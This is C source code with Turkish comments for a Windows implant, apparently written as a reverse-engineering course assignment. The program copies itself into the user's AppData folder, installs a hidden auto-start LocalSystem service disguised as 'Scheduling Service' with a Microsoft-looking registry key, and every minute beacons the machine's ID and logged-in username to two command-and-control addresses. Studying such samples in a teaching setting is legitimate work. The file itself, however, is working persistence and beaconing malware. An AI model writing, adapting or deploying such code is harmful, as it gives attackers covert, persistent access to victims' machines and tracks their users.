// Osman Pamuk
// ilk tarih: 13 Aralık 2013
// code http://msdn.microsoft.com/en-us/library/bb540475(v=vs.85).aspx adresinden alındı
// 2014 Bahar dönemi BGM532 ilk ödev olarak değiştirildi
// 17.03.2015 BGM 532 dersi icin bi daha guncellendi
// 02.08.2017 github da paylasim icin temizlik yapildi
#pragma runtime_checks( "", off ) // daha rahat reverse neg için
// my libs
#include "genel.h"
#include "WebFuncs.h"
#include "Shared.h"
// standat libs
#include <lm.h>
#include <Shlwapi.h>
#include <Wtsapi32.h>

// yuklenmesi gereken kutuphaneler
#pragma comment(lib, "Netapi32.lib")
#pragma comment(lib, "shlwapi.lib") //PathFileExists function ı için
#pragma comment(lib, "Wtsapi32.lib")
// yuklenecek servisin ayarlari
#define SVCNAME		TEXT("Scheduling Service")
#define SERVICE_DISPLAY_NAME  TEXT("Scheduling Service")
#define SERVICE_START_TYPE	SERVICE_AUTO_START
// dosyanın kopyalanacağı nokta ve exe ismi
// eskisi #define NEWPATH1 TEXT("TEMP") 
#define NEWPATH1	TEXT("APPDATA") // windows XP için system in altına da konabilir
#define NEWFILENAME TEXT("Scheduling.exe")
// servisin konfigurasyon bilgilerinin tutulacagi kayit defteri
#define SUBKEY		TEXT("SOFTWARE\\Microsoft\\SchedulingAgent")
#define KEYVALUE	TEXT("TC")
// kayit defterine yazabilmesi icin local admin haklarina sahip olmasi gerecek 
#define SVCHKEY		HKEY_LOCAL_MACHINE
// other constatns
#define IDSIZE		8
#define STDSZSIZE	64
#define DELAY_TIME_SEC 60

SERVICE_STATUS gSvcStatus;
SERVICE_STATUS_HANDLE gSvcStatusHandle;
HANDLE ghSvcStopEvent = NULL;
BOOL m_fStopping;

VOID SvcInstall();
VOID SvcUninstall();
VOID WINAPI SvcCtrlHandler(DWORD);
VOID WINAPI SvcMain(DWORD, LPTSTR*);

VOID ReportSvcStatus(DWORD, DWORD, DWORD);
VOID SvcInit(DWORD, LPTSTR*);
VOID SvcReportEvent(LPTSTR);

BOOL RegGetVal(LPBYTE lpData, LPDWORD pcbData);
VOID DoTheJob();

PTCHAR findPath();
BOOL DeleteRegKeyValue(HKEY hKey, LPCTSTR lpSubKey, LPCTSTR lpKeyValue);
PCHAR GetCurrentUserName();

// Purpose: 
//   Entry point for the process
void __cdecl _tmain(int argc, TCHAR* argv[]) {
	// If command-line parameter is "install", install the service. 
	// If "remove", remove the service
	// Otherwise, the service is probably being started by the SCM.
	if (lstrcmpi(argv[1], TEXT("install")) == 0) {
		SvcInstall();
		return;
	} else if (lstrcmpi(argv[1], TEXT("remove")) == 0) {
		SvcUninstall();
		return;
	}

	PRINTF("Parameters:\n");
	PRINTF(" install  to install the service.\n");
	PRINTF(" remove   to remove the service.\n");

	// TO_DO: Add any additional services for the process to this table.
	SERVICE_TABLE_ENTRY DispatchTable[] =
	{
		{SVCNAME, (LPSERVICE_MAIN_FUNCTION)SvcMain},
		{NULL, NULL}
	};

	// This call returns when the service has stopped. 
	// The process should simply terminate when the call returns.
	if (!StartServiceCtrlDispatcher(DispatchTable)) {
		SvcReportEvent(TEXT("StartServiceCtrlDispatcher"));
	}
}

// Purpose: 
//   Installs a service in the SCM database
VOID SvcInstall() {
	SC_HANDLE schSCManager = NULL;
	SC_HANDLE schService = NULL;
	LONG lRetCode = 0;
	HKEY hk;
	DWORD dwDisp;
	// bu dosyanin full pathi için
	TCHAR pSPath[MAX_PATH];
	PTCHAR pNewPath = NULL;
	char lpID[STDSZSIZE] = ID;

	// yeni dosya path i hesaplayalım
	pNewPath = findPath();
	if (!lstrcmp(pNewPath, TEXT(""))) {
		goto Cleanup;
	}
	//dosyanın tam adresini al
	if (!GetModuleFileName(NULL, pSPath, MAX_PATH)) {
		HATA("SvcInstall", "GetModuleFileName Failed. Cannot install program.");
		goto Cleanup;
	}
	//dosyayı kopyalayacağımız yol mevcut değil ise oluştur
	if (!PathFileExists(pNewPath)) {
		if (!CreateDirectory(pNewPath, NULL)) {
			HATA("SvcInstall", "CreateDirectory Failed. Cannot install program.");
			goto Cleanup;
		}
	}
	// dosya ismini ful path'e ekle
	StringCchCatW(pNewPath, MAX_PATH, NEWFILENAME);
	// calisan dosyanin kopyasini olustur
	if (!CopyFile(pSPath, pNewPath, FALSE)) {
		HATA("SvcInstall", "CopyFile Failed. Cannot install program.");
		goto Cleanup;
	}
	// we dont use this method anymore
#if-0
	// program ID sini oluştur ve kayır defterine kaydet
	if (!GetRandomCharSeq(lpID, IDSIZE)){ // burası değişecek
		HATA("SvcInstall", "GetRandomCharSeq Failed. Cannot install program.");
		goto Cleanup;
	}
#endif

	// Get a handle to the SCM database.  
	schSCManager = OpenSCManager(
		NULL, // local computer
		NULL, // ServicesActive database 
		SC_MANAGER_ALL_ACCESS); // full access rights  
	if (NULL == schSCManager) {
		HATA("SvcInstall", "OpenSCManager failed.");
		goto Cleanup;
	}

	// Create the service
	schService = CreateService(
		schSCManager, // SCM database 
		SVCNAME, // name of service 
		SERVICE_DISPLAY_NAME, // service name to display 
		SERVICE_ALL_ACCESS, // desired access 
		SERVICE_WIN32_OWN_PROCESS, // service type 
		SERVICE_START_TYPE, // start type 
		SERVICE_ERROR_NORMAL, // error control type 
		pNewPath, // path to service's binary 
		NULL, // no load ordering group 
		NULL, // no tag identifier 
		NULL, // no dependencies 
		NULL, // LocalSystem account // !!!! hesap LocalService olabilir mi? Ama şimdilik System ile bağlayalım :)
		NULL); // no password 
	if (schService == NULL) {
		HATA("SvcInstall", "CreateService failed.");
		CloseServiceHandle(schSCManager);
		goto Cleanup;
	} else {
		PRINTF("Service installed successfully\n");
	}

	// ID icin registry değerinin oluşturma işlemi	
	if (lRetCode = RegCreateKeyEx(SVCHKEY, SUBKEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hk, &dwDisp)) {
		HATA2("SvcInstall", "RegCreateKeyEx error.", lRetCode); // lRetCode is the real error code
		goto Cleanup;
	}

	// ID icin ilk değeri atayalım
	if (lRetCode = RegSetValueEx(hk, // subkey handle 
	                             KEYVALUE, // value name 
	                             0, // must be zero 
	                             REG_SZ, // value type 
	                             (LPBYTE)lpID, // pointer to value data 
	                             IDSIZE * sizeof(CHAR) + 1)) // data size
	{
		HATA2("SvcInstall", "RegSetValueEx error.", lRetCode);
	}
	RegCloseKey(hk);

	// Centralized cleanup for all allocated resources. 
Cleanup:
	if (pNewPath)
		free(pNewPath);

	if (schSCManager) {
		CloseServiceHandle(schSCManager);
		schSCManager = NULL;
	}
	if (schService) {
		CloseServiceHandle(schService);
		schService = NULL;
	}
}

// Purpose: 
//  Stop and remove the service from the local service control  manager database. 
// 
//   NOTE: If the function fails to uninstall the service, it prints the  
//   error in the standard output stream for users to diagnose the problem. 
VOID SvcUninstall() {
	SC_HANDLE schSCManager = NULL;
	SC_HANDLE schService = NULL;
	SERVICE_STATUS ssSvcStatus = {};

	// Open the local default service control manager database 
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (schSCManager == NULL) {
		HATA("SvcUninstall", "OpenSCManager failed.");
		goto Cleanup;
	}

	// Open the service with delete, stop, and query status permissions 
	schService = OpenService(schSCManager, SVCNAME, SERVICE_STOP |
	                         SERVICE_QUERY_STATUS | DELETE);
	if (schService == NULL) {
		HATA("SvcUninstall", "OpenService failed.");
		goto Cleanup;
	}

	// Try to stop the service 
	if (ControlService(schService, SERVICE_CONTROL_STOP, &ssSvcStatus)) {
		PRINTF2("Stopping %s.", SVCNAME);
		Sleep(1000);

		while (QueryServiceStatus(schService, &ssSvcStatus)) {
			if (ssSvcStatus.dwCurrentState == SERVICE_STOP_PENDING) {
				PRINTF(".");
				Sleep(1000);
			} else break;
		}

		if (ssSvcStatus.dwCurrentState == SERVICE_STOPPED) {
			PRINTF2("\n%s is stopped.\n", SVCNAME);
		} else {
			PRINTF2("\n%s failed to stop.\n", SVCNAME);
		}
	}

	// Now remove the service by calling DeleteService. 
	if (!DeleteService(schService)) {
		HATA("SvcUninstall", "DeleteService failed.");
		goto Cleanup;
	}

	PRINTF2("%s is removed.\n", SVCNAME);

	// Registry temizleme işlemi
	if (!DeleteRegKeyValue(SVCHKEY, SUBKEY, KEYVALUE)) {
		HATA("SvcUninstall", "DeleteRegKeyValue failed.");
		goto Cleanup;
	}

Cleanup:
	// Centralized cleanup for all allocated resources. 
	if (schSCManager) {
		CloseServiceHandle(schSCManager);
		schSCManager = NULL;
	}
	if (schService) {
		CloseServiceHandle(schService);
		schService = NULL;
	}
}

//
// Purpose: 
//   Entry point for the service
//
// Parameters:
//   dwArgc - Number of arguments in the lpszArgv array
//   lpszArgv - Array of strings. The first string is the name of
//     the service and subsequent strings are passed by the process
//     that called the StartService function to start the service.
VOID WINAPI SvcMain(DWORD dwArgc, LPTSTR* lpszArgv) {
	// Register the handler function for the service
	gSvcStatusHandle = RegisterServiceCtrlHandler(
		SVCNAME,
		SvcCtrlHandler);

	if (!gSvcStatusHandle) {
		SvcReportEvent(TEXT("RegisterServiceCtrlHandler"));
		return;
	}

	// Report initial status to the SCM
	ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

	// These SERVICE_STATUS members remain as set here
	gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	gSvcStatus.dwServiceSpecificExitCode = 0;

	// Perform service-specific initialization and work.
	SvcInit(dwArgc, lpszArgv);
}

//
// Purpose: 
//   The service code
//
// Parameters:
//   dwArgc - Number of arguments in the lpszArgv array
//   lpszArgv - Array of strings. The first string is the name of
//     the service and subsequent strings are passed by the process
//     that called the StartService function to start the service.
VOID SvcInit(DWORD dwArgc, LPTSTR* lpszArgv) {
	// TO_DO: Declare and set any required variables.
	//   Be sure to periodically call ReportSvcStatus() with 
	//   SERVICE_START_PENDING. If initialization fails, call
	//   ReportSvcStatus with SERVICE_STOPPED.

	// Create an event. The control handler function, SvcCtrlHandler,
	// signals this event when it receives the stop control code.
	ghSvcStopEvent = CreateEvent(
		NULL, // default security attributes
		TRUE, // manual reset event
		FALSE, // not signaled
		NULL); // no name

	if (ghSvcStopEvent == NULL) {
		ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
		return;
	}

	m_fStopping = FALSE;

	// Report running status when initialization is complete.
	ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);

	// TO_DO: Perform work until service stops.
	while (!m_fStopping) {
		// main method to do the job
		DoTheJob();
		WaitForSingleObject(ghSvcStopEvent, DELAY_TIME_SEC * 1000);
	}

	// Check whether to stop the service.
	//WaitForSingleObject(ghSvcStopEvent, INFINITE);

	ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
	//    return;
}

//
// Purpose: 
//   Sets the current service status and reports it to the SCM.
//
// Parameters:
//   dwCurrentState - The current state (see SERVICE_STATUS)
//   dwWin32ExitCode - The system error code
//   dwWaitHint - Estimated time for pending operation, 
//     in milliseconds
VOID ReportSvcStatus(DWORD dwCurrentState,
                     DWORD dwWin32ExitCode,
                     DWORD dwWaitHint) {
	static DWORD dwCheckPoint = 1;

	// Fill in the SERVICE_STATUS structure.
	gSvcStatus.dwCurrentState = dwCurrentState;
	gSvcStatus.dwWin32ExitCode = dwWin32ExitCode;
	gSvcStatus.dwWaitHint = dwWaitHint;

	if (dwCurrentState == SERVICE_START_PENDING)
		gSvcStatus.dwControlsAccepted = 0;
	else gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

	if ((dwCurrentState == SERVICE_RUNNING) ||
		(dwCurrentState == SERVICE_STOPPED))
		gSvcStatus.dwCheckPoint = 0;
	else gSvcStatus.dwCheckPoint = dwCheckPoint++;

	// Report the status of the service to the SCM.
	SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
}

//
// Purpose: 
//   Called by SCM whenever a control code is sent to the service
//   using the ControlService function.
//
// Parameters:
//   dwCtrl - control code
VOID WINAPI SvcCtrlHandler(DWORD dwCtrl) {
	// Handle the requested control code. 
	switch (dwCtrl) {
		case SERVICE_CONTROL_STOP:
			m_fStopping = TRUE;
			ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);

			// Signal the service to stop.
			SetEvent(ghSvcStopEvent);
			ReportSvcStatus(gSvcStatus.dwCurrentState, NO_ERROR, 0);

			return;

		case SERVICE_CONTROL_INTERROGATE:
			break;

		default:
			break;
	}
}

// main method to be called periodically by the service
VOID DoTheJob() {
	CHAR szID[STDSZSIZE];
	CHAR szMsj[STDSZSIZE];
	DWORD cbData = STDSZSIZE;
	// atkif session sahibi olan kullanicinin ismini bul
	PCHAR lpszUserName = GetCurrentUserName();
	// std::string CCadrs[] = { WEBADRESS1, WEBADRESS2 };
	PCHAR CCadrs[] = {WEBADRESS1, WEBADRESS2};

	// kayit defterindeki ID yi oku
	if (!RegGetVal((LPBYTE)szID, &cbData)) {
		// ID yoksa calismayi sonlandir
		goto Cleanup;
	}

	ZeroMemory(szMsj, STDSZSIZE);
	StringCchCatA(szMsj, STDSZSIZE, szID);

	// ilk once internet var mi kontrol et
	if (InternetCheck()) {
		for (int i = 0; i < 2; ++i) {
			if (WebPing(lpszUserName, CCadrs[i], szMsj)) {
				// SvcReportEvent(TEXT("WebPing"));
				// bağlantı kuruldu, diğer CC yi denemeye gerek yok
				goto Cleanup;
			}
		}
	}

Cleanup:
	return;
}

// dont forget to free return pointer
PTCHAR findPath() {
	PTCHAR pPath = NULL; // bu dosyanin full pathi için
	// envVariable size 
	DWORD nSize = 0;
	// dosya yolunu hesaplamak ve tutmak için
	PTCHAR pszPath1 = L"";

	// veriyi tutmak için gerekli olan boyutu ogren
	nSize = GetEnvironmentVariable(NEWPATH1, NULL, NULL);
	if (nSize == 0) {
		HATA("findPath", "GetEnvironmentVariable1 failed.");
		goto Cleanup;
	}
	// öğrenilen boyut kadar alan ayarla
	pszPath1 = (PTCHAR)malloc(nSize * sizeof(TCHAR)); // temizleme lazım	
	// veriyi al
	nSize = GetEnvironmentVariable(NEWPATH1, pszPath1, nSize);
	if (nSize == 0) {
		HATA("findPath", "GetEnvironmentVariable2 failed.");
		goto Cleanup;
	}

	//verinin koyulacağı yeri ayarla
	pPath = (PTCHAR)malloc(MAX_PATH * sizeof(TCHAR));
	ZeroMemory(pPath, MAX_PATH * sizeof(TCHAR));

	// stringleri birbirine ekleme işlemi
	// ilk kısmı ekle
	StringCchCat(pPath, MAX_PATH, pszPath1);
	// ikinci kısmı ekle
	// StringCchCat(pPath, MAX_PATH, NEWPATH2);
	StringCchCat(pPath, MAX_PATH, _T("\\"));

Cleanup:
	free(pszPath1);

	return pPath;
}

// delete registry key value
BOOL DeleteRegKeyValue(HKEY hKey, LPCTSTR lpSubKey, LPCTSTR lpKeyValue) {
	HKEY hk = NULL;
	BOOL bSuccess = FALSE;

	if (RegOpenKeyEx(hKey, lpSubKey, 0, KEY_SET_VALUE, &hk)) {
		// SvcReportEvent(TEXT("DeleteRegKeyValue:RegOpenKeyEx"));
		HATA("DeleteRegKeyValue", "RegOpenKeyEx failed.");
		goto Cleanup;
	}

	// RegDeleteKeyValue kullanmistik ama XP de yemedi... !!!
	if (RegDeleteValue(hk, lpKeyValue)) {
		// SvcReportEvent(TEXT("DeleteRegKeyValue:RegDeleteValue"));
		HATA("DeleteRegKeyValue", "RegDeleteValue failed.");
		goto Cleanup;
	}

	// buraya kadar geldiyse basarilidir
	bSuccess = TRUE;

Cleanup:
	if (hk)
		RegCloseKey(hk);

	return bSuccess;
}

// Purpose: 
//   Logs messages to the event log
// Parameters:
//   szFunction - name of function that failed
// Remarks:
//   The service must have an entry in the Application event log.
VOID SvcReportEvent(LPTSTR szFunction) {
	LPCTSTR lpszStrings[2];
	TCHAR Buffer[80];
	HANDLE hEventSource = RegisterEventSource(NULL, SVCNAME);

	if (NULL != hEventSource) {
		StringCchPrintf(Buffer, 80, TEXT("%s failed with %d"), szFunction, GetLastError());

		lpszStrings[0] = SVCNAME;
		lpszStrings[1] = Buffer;

		ReportEvent(hEventSource, // event log handle
		            EVENTLOG_ERROR_TYPE, // event type
		            0, // event category
		            0, // event identifier // !!!! burası tam olmamış olabilir..
		            NULL, // no security identifier
		            2, // size of lpszStrings array
		            0, // no binary data
		            lpszStrings, // array of strings
		            NULL); // no binary data

		DeregisterEventSource(hEventSource);
	}
}

// onceden belli bir registy kaydindaki veriyi okumak icin
BOOL RegGetVal(LPBYTE lpData, LPDWORD pcbData) {
	HKEY hKey;
	BOOL bSuccess = FALSE;

	if (RegOpenKeyEx(SVCHKEY, SUBKEY, 0, KEY_QUERY_VALUE, &hKey)) {
		SvcReportEvent(TEXT("RegOpenKeyEx"));
		goto Cleanup;
	}

	// 64 bit te sorun mu oluyor?
	if (RegQueryValueEx(hKey, KEYVALUE, NULL, NULL, lpData, pcbData)) {
		SvcReportEvent(TEXT("RegQueryValueEx"));
		goto Cleanup;
	}

	bSuccess = TRUE;

Cleanup:
	RegCloseKey(hKey);

	return bSuccess;
}

// internetten bulundu
// servis olarak calisirken aktif session daki logon name i aliyor
// acaba birden fazla kullanici logon olmus olursa ne olur
PCHAR GetCurrentUserName() {
	DWORD retSize = 0;
	PCHAR usrNameA;

	// Get the user of the "active" TS session
	DWORD dwSessionId = WTSGetActiveConsoleSessionId();

	if (0xFFFFFFFF == dwSessionId) // if no active session
		return "";

	if (!WTSQuerySessionInformationA(WTS_CURRENT_SERVER_HANDLE, dwSessionId, WTSUserName, &usrNameA, &retSize)) {
		return "";
	}

	return usrNameA;
}
